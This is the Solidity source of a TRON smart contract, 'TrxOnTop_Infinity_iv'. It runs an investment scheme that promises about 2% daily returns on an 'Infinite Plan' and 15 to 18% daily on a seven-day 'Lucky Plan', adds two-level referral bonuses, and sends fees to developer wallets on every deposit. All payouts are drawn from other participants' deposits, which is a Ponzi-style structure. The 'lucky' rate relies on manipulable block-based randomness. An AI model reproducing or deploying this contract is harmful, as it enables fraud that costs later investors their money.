//SourceUnit: TrxOnTop_Infinity_iv.sol

pragma solidity 0.5.8;

/* ---> (www.trxontop.com)  | (c) 2020 Developed by TRX-ON-TOP TEAM TrxOnTop_Infinity_iv.sol | La Habana - Cuba <------ */

contract TrxOnTop_Infinity_iv {
    // -- Investor -- //
    struct InfinitePlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 insuredDeposit;
        uint256 dividends; 
        uint256 depositsCount;
        uint256 withdrawn;
    }  
    
    struct LuckyPlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 tarif;
        uint256 dividends;
        uint256 depositsCount;
        uint256 minimal_DepositCount;
        uint256 depositStartTime; 
        uint256 depositFinishTime;
        uint256 withdrawn;
        bool minimal_lucky;
    }      
  
    struct Player {
        // Infinite Plan
        InfinitePlan[1] infinitePlan;
        
        // Lucky Plan
        LuckyPlan[1] luckyPlan;
        
        // General
        address upline;  
        uint256 match_bonus;
        uint256 last_payout;
        uint256 last_reinvest;
        uint256 total_withdrawn;
        uint256 total_reinvested;
        uint256 bon_reinvest_count;
        uint256 bon_lucky_count;
        uint256 total_withdrawnReferral;
        uint256 total_match_bonus;
        uint256 total_invested;
        uint256 firstDep_Time;
        mapping(uint8 => uint256) structure;
    }
    
    // Infinite Plan
    uint256 private infinitePlanDeposit_StartTime;
    
    // Lucky Plan
    uint256 private luckyPlanDeposit_StartTime;
    uint40  private lucky_count_int;
    uint256 private last_lucky_int;
    
    // General
    address payable private dev_0;
    address payable private dev_1;
    address payable private dev_2;
    uint256 private contract_CreateTime;
    uint256 private contract_StartTime;
    uint256 private invested;
	uint256 private investors;
    uint256 private totalWithdrawn;
    uint256 private totalWithdrawnReferral;
    uint256 private match_bonus;
    uint256 private infiniteDepositCount;
    uint256 private luckyDepositCount;
    uint256 private minimalLuckyDepositCount;
    uint256 private last_daily_check;
    uint256 private withdrawn_today; 
    uint256 private insuredBalance;

    uint256 private constant LUCKYPLAN_LIFETIME               = 7 * 24 * 60 * 60;
    uint256 private constant CONTRACT_TIMETOSTART             = 6 * 24 * 60 * 60;
    uint256 private constant LUCKYPLAN_DEPOSIT_TIMETOSTART    = 6 * 24 * 60 * 60;
    uint256 private constant INFINITEPLAN_DEPOSIT_TIMETOSTART = 0 * 24 * 60 * 60;
    
    uint256 private constant ADV_FEE               = 50;
    uint256 private constant DEV_FEE               = 25;
    uint256 private constant MAX_LUCKY_IN_6HOUR    = 20;
    uint256 private constant INFINITE_BASIC_TARIF  = 2E6;
    uint256 private constant MIN_INFINITE_INVEST   = 100E6;
    uint256 private constant MINIMAL_LUCKY_PENALTY = 20E6;
    uint256 private constant MAX_DAILY_WITHDRAW    = 100000E6;
    uint256 private constant SECURE_PERCENT        = 20;
    uint256 private constant WAIT_FOR_REINVEST     = 24 * 60 * 60;
    uint256 private constant WAIT_FOR_CHECK        = 24 * 60 * 60;    
    uint256 private constant WAIT_FOR_NEXT_LUCKY   = 7 * 60 * 60;
    uint8[] private REF_BONUSES                    = [4, 1];
    
    mapping(address => Player) private players;

    event Upline(address indexed addr, address indexed upline);
    event NewInfiniteDeposit(address indexed addr, uint256 amount);
    event NewLuckyDeposit(address indexed addr, uint256 amount);
    event NewReactiveLuckyPlan(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event WithdrawInfinite(address indexed addr, uint256 amount);
    event WithdrawSecured(address indexed addr, uint256 amount);
    event WithdrawLucky(address indexed addr, uint256 amount);
    event WithdrawReferral(address indexed addr, uint256 amount);
    event NewSecureInfDeposit(address indexed addr, uint256 amount);

    constructor(address payable dev1, address payable dev2) public {
        dev_0 = msg.sender;
        dev_1 = dev1;
        dev_2 = dev2;
        contract_CreateTime = now;
        contract_StartTime = contract_CreateTime + CONTRACT_TIMETOSTART;
        last_daily_check = contract_StartTime;
        
        // Infinite Plan
        infinitePlanDeposit_StartTime = contract_CreateTime + INFINITEPLAN_DEPOSIT_TIMETOSTART;
        
        // Lucky Plan
        luckyPlanDeposit_StartTime = contract_CreateTime + LUCKYPLAN_DEPOSIT_TIMETOSTART;
        last_lucky_int = luckyPlanDeposit_StartTime;
    }
   
    function refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < REF_BONUSES.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * REF_BONUSES[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != dev_0) {
             if(players[_upline].infinitePlan[0].activeDeposit == 0) {
                 _upline = dev_0;
             }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline);
            
            for(uint8 i = 0; i < REF_BONUSES.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function getLuckyTarif() view private returns (uint256) { 
        uint8 value = uint8(uint256(keccak256(abi.encode(block.timestamp, block.difficulty)))%31) + 150; 
        return value;
    }  
    
    function infinitePlanDeposit(address _upline) external payable {
        updateDailyConf();
        Player storage player = players[msg.sender];
        
        require(now >= infinitePlanDeposit_StartTime, "Infinite Plan is not available yet");
        require(msg.value >= MIN_INFINITE_INVEST, "Minimum to invest is 100 TRX");
    
        setUpline(msg.sender, _upline);

        if (player.infinitePlan[0].depositsCount == 0) {
            player.firstDep_Time = now;
            player.last_payout = maxVal(now, contract_StartTime);
            player.last_reinvest = maxVal(now, contract_StartTime);
            investors++;
        } else {
            update_InfinitePlanInterestProfit(msg.sender);
        }

        player.infinitePlan[0].depositsCount++;
        infiniteDepositCount ++;
        invested += msg.value;
        player.infinitePlan[0].activeDeposit += msg.value;
        player.infinitePlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;

        payContractFee(msg.value);
       
        refPayout(msg.sender, msg.value);
        
        emit NewInfiniteDeposit(msg.sender, msg.value);
    }
    
    function luckyPlanDeposit() external payable {
        updateDailyConf();
        if (now > last_lucky_int + WAIT_FOR_NEXT_LUCKY) {
            last_lucky_int = now;
            lucky_count_int = 0;
        }   
        Player storage player = players[msg.sender];
        require(now >= luckyPlanDeposit_StartTime, "Lucky Plan is not available yet");
        require(player.luckyPlan[0].activeDeposit == 0, "Only 1 Lucky Plan is allowed at the same time");
        require(lucky_count_int < MAX_LUCKY_IN_6HOUR, "Quota exceeded!!");
        require((msg.value == 200E6) || (msg.value == 500E6  && player.infinitePlan[0].activeDeposit > 250E6) || (msg.value == 1000E6 && player.infinitePlan[0].activeDeposit > 500E6));
        if (msg.value == 200E6 && player.infinitePlan[0].activeDeposit == 0) {
           player.luckyPlan[0].minimal_lucky = true; 
           player.luckyPlan[0].minimal_DepositCount ++;
           minimalLuckyDepositCount ++;
        } else {
           player.luckyPlan[0].minimal_lucky = false; 
           player.bon_lucky_count++;
        }
        lucky_count_int++;
        luckyDepositCount++;
        player.luckyPlan[0].depositsCount++;
        invested += msg.value;
        player.luckyPlan[0].activeDeposit = msg.value;
        player.luckyPlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;
        player.luckyPlan[0].tarif = getLuckyTarif();
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + LUCKYPLAN_LIFETIME;

        payContractFee(msg.value);
        emit NewLuckyDeposit(msg.sender, msg.value);
    }    
    
    function update_InfinitePlanInterestProfit(address _addr) private {
        Player storage player = players[_addr];
        uint256 amount = getInfinitePlan_InterestProfit(_addr);
        if(amount > 0) {
            player.infinitePlan[0].dividends += amount;
            player.last_payout = now;
        }
    }   
    
    function infinitePlanWithdraw() external {
        updateDailyConf();
        Player storage player = players[msg.sender];
        
        uint contractBalance = getAvailableContractBalance();
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 amount = player.infinitePlan[0].dividends;
       
        require(player.infinitePlan[0].depositsCount > 0);
        require(amount >= player.infinitePlan[0].recordDeposit);
       
        if (player.infinitePlan[0].insuredDeposit > 0) {
           uint256 sec_amount = player.infinitePlan[0].insuredDeposit;
           player.infinitePlan[0].insuredDeposit = 0;
           uint256 ib = insuredBalance; 
           insuredBalance = minZero(ib, sec_amount);
           amount -= sec_amount;
           player.total_withdrawn += sec_amount;
           player.infinitePlan[0].withdrawn += sec_amount;
           totalWithdrawn += sec_amount;           
           msg.sender.transfer(sec_amount);
           emit WithdrawSecured(msg.sender, sec_amount); 
           
           player.infinitePlan[0].dividends = amount; 
           player.infinitePlan[0].activeDeposit = 0;
           player.infinitePlan[0].recordDeposit = 0;
           player.bon_lucky_count = 0;
           player.bon_reinvest_count = 0;
           if (contractBalance >= amount && minZero(MAX_DAILY_WITHDRAW, withdrawn_today) >= amount) {
               player.infinitePlan[0].dividends = 0;
               player.total_withdrawn += amount;
               player.infinitePlan[0].withdrawn += amount;
               totalWithdrawn += amount;
               withdrawn_today += amount;
               msg.sender.transfer(amount);
               emit WithdrawInfinite(msg.sender, amount); 
           }           
        } else {
           if (contractBalance >= amount && minZero(MAX_DAILY_WITHDRAW, withdrawn_today) >= amount) { 
               player.infinitePlan[0].dividends = 0; 
               player.infinitePlan[0].activeDeposit = 0;
               player.infinitePlan[0].recordDeposit = 0;
               player.bon_lucky_count = 0;
               player.bon_reinvest_count = 0;
               player.total_withdrawn += amount;
               player.infinitePlan[0].withdrawn += amount;
               totalWithdrawn += amount;
               withdrawn_today += amount;
               msg.sender.transfer(amount);
               emit WithdrawInfinite(msg.sender, amount); 
           } 
        }
    }
    
    function luckyPlanWithdraw() external {
        updateDailyConf();
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].depositFinishTime < now, "Plan not finished yet");
        
        uint amount = getLuckyPlan_InterestProfit(msg.sender); 
        if (player.luckyPlan[0].minimal_lucky == true) {
            amount = minZero(amount, MINIMAL_LUCKY_PENALTY);  
        }
        uint contractBalance = getAvailableContractBalance();
        require(contractBalance >= amount, "Contract balance < Interest Profit");
        
        player.luckyPlan[0].activeDeposit = 0;
        player.luckyPlan[0].tarif = 0;
        player.total_withdrawn += amount;
        player.luckyPlan[0].withdrawn += amount;
        totalWithdrawn += amount;  
        
        msg.sender.transfer(amount);
        emit WithdrawLucky(msg.sender, amount);
    }     
    
    function reactiveLuckyPlan() external {
        updateDailyConf();
        if (now > last_lucky_int + WAIT_FOR_NEXT_LUCKY) {
            last_lucky_int = now + WAIT_FOR_NEXT_LUCKY;
            lucky_count_int = 0;
        }        
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].depositFinishTime < now, "Plan not finished yet");
        require(player.luckyPlan[0].minimal_lucky == false);
        require(lucky_count_int < MAX_LUCKY_IN_6HOUR);
        
        uint w_amount = minZero(getLuckyPlan_InterestProfit(msg.sender), player.luckyPlan[0].activeDeposit); 
        
        require((player.luckyPlan[0].activeDeposit == 200E6  && player.infinitePlan[0].activeDeposit >= 100E6) || 
                (player.luckyPlan[0].activeDeposit == 500E6  && player.infinitePlan[0].activeDeposit >= 250E6) || 
                (player.luckyPlan[0].activeDeposit == 1000E6 && player.infinitePlan[0].activeDeposit >= 500E6));
        
        uint contractBalance = getAvailableContractBalance();
        require(contractBalance >= w_amount, "Contract balance < Interest Profit");
        player.total_withdrawn += w_amount;
        player.luckyPlan[0].withdrawn += w_amount;
        totalWithdrawn += w_amount;  
        msg.sender.transfer(w_amount);
        emit WithdrawLucky(msg.sender, w_amount);        
        
        lucky_count_int ++;
        player.luckyPlan[0].depositsCount++;
        player.bon_lucky_count++;
        luckyDepositCount++;
        player.luckyPlan[0].recordDeposit += player.luckyPlan[0].activeDeposit;
        player.total_invested += player.luckyPlan[0].activeDeposit;
        player.luckyPlan[0].tarif = getLuckyTarif();
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + LUCKYPLAN_LIFETIME;
        payContractFee(player.luckyPlan[0].activeDeposit);
        emit NewReactiveLuckyPlan(msg.sender, player.luckyPlan[0].activeDeposit);
    }     
    
    function referralWithdraw() external {
        Player storage player = players[msg.sender];
        uint contractBalance = getAvailableContractBalance();
        require(player.infinitePlan[0].depositsCount > 0, "Active deposit is require");
        require(minZero(MAX_DAILY_WITHDRAW, withdrawn_today) >= player.match_bonus, "Amount exceeds daily limit");
        require(contractBalance >= player.match_bonus, "Contract balance < Referral bonus");

        uint256 amount = player.match_bonus;
        player.match_bonus = 0;
        withdrawn_today += amount;

        player.total_withdrawn += amount;
        player.total_withdrawnReferral += amount;
        totalWithdrawnReferral += amount;
        totalWithdrawn += amount;

        msg.sender.transfer(amount);
        emit WithdrawReferral(msg.sender, amount);
    }    

    function infinitePlanReinvest() external {
        updateDailyConf();
        Player storage player = players[msg.sender];
        require(player.last_reinvest + WAIT_FOR_REINVEST < now, "Reinvest are not available yet"); 
        require(player.infinitePlan[0].activeDeposit >= MIN_INFINITE_INVEST, "Infinite Deposit is require first");
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.infinitePlan[0].dividends;
        player.infinitePlan[0].dividends = 0;
        player.last_reinvest = now;
        player.infinitePlan[0].activeDeposit += reinvestAmount; 
        player.total_reinvested += reinvestAmount; 
    } 
    
    function allReinvest() external {
        updateDailyConf();
        Player storage player = players[msg.sender];
        require(player.last_reinvest + WAIT_FOR_REINVEST < now, "Reinvest are not available yet"); 
        require(player.infinitePlan[0].activeDeposit >= MIN_INFINITE_INVEST, "Infinite Deposit is require first");
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.infinitePlan[0].dividends + player.match_bonus;
        player.infinitePlan[0].dividends = 0;
        player.match_bonus = 0;
        player.bon_reinvest_count ++;
        player.last_reinvest = now;
        player.infinitePlan[0].activeDeposit += reinvestAmount;
        player.total_reinvested += reinvestAmount;
    }  

    function updateDailyConf() internal {
        if (now > last_daily_check + WAIT_FOR_CHECK) {
           last_daily_check = now;
           withdrawn_today = 0;
        }
    }      
    
    function getInfinitePlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 fr = player.last_payout;
        if (contract_StartTime > now) {
          fr = now; 
        }
        uint256 Tarif = INFINITE_BASIC_TARIF + getLuckyBonus(_addr) + getReinvestBonus(_addr);
        uint256 to = now;
        if(fr < to) {
            value = player.infinitePlan[0].activeDeposit * (to - fr) * Tarif / 86400 / 100E6;
        } else {
            value = 0;
        }
        return value;
    }
  
    function getLuckyPlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        if (player.luckyPlan[0].activeDeposit > 0) {
          if (now < player.luckyPlan[0].depositFinishTime) {
               uint256 fr = player.luckyPlan[0].depositStartTime;
               uint256 to = now;
               value = player.luckyPlan[0].activeDeposit * (to - fr) * player.luckyPlan[0].tarif / 86400 / 1000;
          } else {
            value = player.luckyPlan[0].activeDeposit * LUCKYPLAN_LIFETIME * player.luckyPlan[0].tarif / 86400 / 1000;
          } 
        } else {
            value = 0;
        }
        return value;
    } 
    
    function secureInfiniteInvesment() external payable {  
        updateDailyConf();
        require(now >= infinitePlanDeposit_StartTime);
        Player storage player = players[msg.sender];  
        uint256 sec_amount = minZero(player.infinitePlan[0].recordDeposit, player.infinitePlan[0].insuredDeposit);
        require(sec_amount > 0 && msg.value == sec_amount * SECURE_PERCENT / 100);
        require(getAvailableContractBalance() > sec_amount);
        player.infinitePlan[0].insuredDeposit += sec_amount;
        insuredBalance += sec_amount;
        emit NewSecureInfDeposit(msg.sender, sec_amount);
    }    

    function payContractFee(uint256 val) private {
        uint256 adv_amount = (val * ADV_FEE) / 1000;
        uint256 dev_amount = (val * DEV_FEE) / 1000;
        dev_1.transfer(dev_amount);
        dev_2.transfer(dev_amount);
        dev_0.transfer(adv_amount);
    }
    
    function minZero(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a - b; 
        } else {
           return 0;    
        }    
    }   
    
    function maxVal(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a; 
        } else {
           return b;    
        }    
    }
    
    function minVal(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return b; 
        } else {
           return a;    
        }    
    }
    
	function getAvailableContractBalance() internal view returns (uint256) {
		return minZero(address(this).balance, insuredBalance);
	}   
	
    function getLuckyBonus(address _addr) internal view returns(uint256) { 
        Player storage player = players[_addr]; 
        uint256 BON = 0.2E6;
        uint256 MAX = 1.6E6;
        return minVal(MAX, player.bon_lucky_count * BON);
    }
    
    function getReinvestBonus(address _addr) internal view returns(uint256) { 
        Player storage player = players[_addr]; 
        uint256 BON = 0.1E6;
        uint256 MAX = 1.4E6;
        return minVal(MAX, player.bon_reinvest_count * BON);
    }    
    
    function userGeneralInfo(address _addr) view external returns(uint256 _totalInvested, uint256 _totalReinvested, uint256 _totalWithdrawn, uint256 _total_WithdrawnReferral, 
                                                                  uint256 _totalMatchBonus, uint256 _matchBonus, uint256 _runningTime, uint256[3] memory _structure) {
        Player storage player = players[_addr];
        
        uint256 runningTime = 0;
        if (player.total_invested > 0) {
         runningTime = now - player.firstDep_Time;
        }
        
        for(uint8 i = 0; i < REF_BONUSES.length; i++) {
            _structure[i] = player.structure[i];
        }
        return (
            player.total_invested,
            player.total_reinvested,
            player.total_withdrawn,
            player.total_withdrawnReferral,
            player.total_match_bonus,
            player.match_bonus,
            runningTime,
            _structure
        );    
    }  
    
    function userBonusInfo(address _addr) view external returns(uint256 _basicTarif, uint256 _luckyBon, uint256 _reinvestBon, uint256 totalTarif) {
        return (
            INFINITE_BASIC_TARIF,
            getLuckyBonus(_addr),
            getReinvestBonus(_addr),
            INFINITE_BASIC_TARIF + getLuckyBonus(_addr) + getReinvestBonus(_addr)
        );    
    }   
    
    function userInfinitePlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _dividends, uint256 _depositsCount, 
                                                                       uint256 _withdrawn, uint256 _insuredDeposit, uint256 _nextReinvest) {
        Player storage player = players[_addr];
        uint256 next_reinvest;
       
        if (now < contract_StartTime) {
            next_reinvest = 0;
        } else {
            next_reinvest = minZero(player.last_reinvest + WAIT_FOR_REINVEST, now);
        }
       
        return (
            player.infinitePlan[0].activeDeposit,
            player.infinitePlan[0].recordDeposit,
            player.infinitePlan[0].dividends + getInfinitePlan_InterestProfit(_addr),
            player.infinitePlan[0].depositsCount,
            player.infinitePlan[0].withdrawn,
            player.infinitePlan[0].insuredDeposit,
            next_reinvest
        );  
    }    
    
    function userLuckyPlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _tarif, uint256 _dividends, uint256 _depositsCount, 
                                                                    uint256 _minimalDepositsCount, uint256 _withdrawn, bool _minimalLucky, uint256 _nextWithdraw) {
        Player storage player = players[_addr];
        return (
            player.luckyPlan[0].activeDeposit,
            player.luckyPlan[0].recordDeposit,
            player.luckyPlan[0].tarif,
            getLuckyPlan_InterestProfit(_addr),
            player.luckyPlan[0].depositsCount,
            player.luckyPlan[0].minimal_DepositCount,
            player.luckyPlan[0].withdrawn,
            player.luckyPlan[0].minimal_lucky,
            minZero(player.luckyPlan[0].depositFinishTime, now)
        );  
    }  
    
    function contractInfo() view external returns(uint256 _invested, uint256 _investors, uint256 _matchBonus, uint256 _infiniteDepositCount, uint256 _luckyDepositCount, 
                                                  uint256 _minimalLuckyDepositCount, uint256 _insuredBalance, uint256 _luckyCountInt, uint256 _nextLucky,
                                                  uint256 _withdrawnToday, uint256 _nextResetWithdraw, uint256 _contractIniTime, uint256 _infiniteDepIniTime, uint256 _luckyDepIniTime) {
        uint256 next_reset_withdraw;        
        
        if (now < contract_StartTime) {
            next_reset_withdraw = 0;
        } else {
            next_reset_withdraw = minZero(last_daily_check + WAIT_FOR_CHECK, now);
        }
        
        return (
            invested,
            investors,
            match_bonus,
            infiniteDepositCount,
            luckyDepositCount,
            minimalLuckyDepositCount,
            insuredBalance,
            lucky_count_int,
            minZero(last_lucky_int + WAIT_FOR_NEXT_LUCKY, now),
            withdrawn_today,
            next_reset_withdraw,            
            minZero(contract_StartTime, now),
            minZero(infinitePlanDeposit_StartTime, now),
            minZero(luckyPlanDeposit_StartTime, now)
        );
    }
}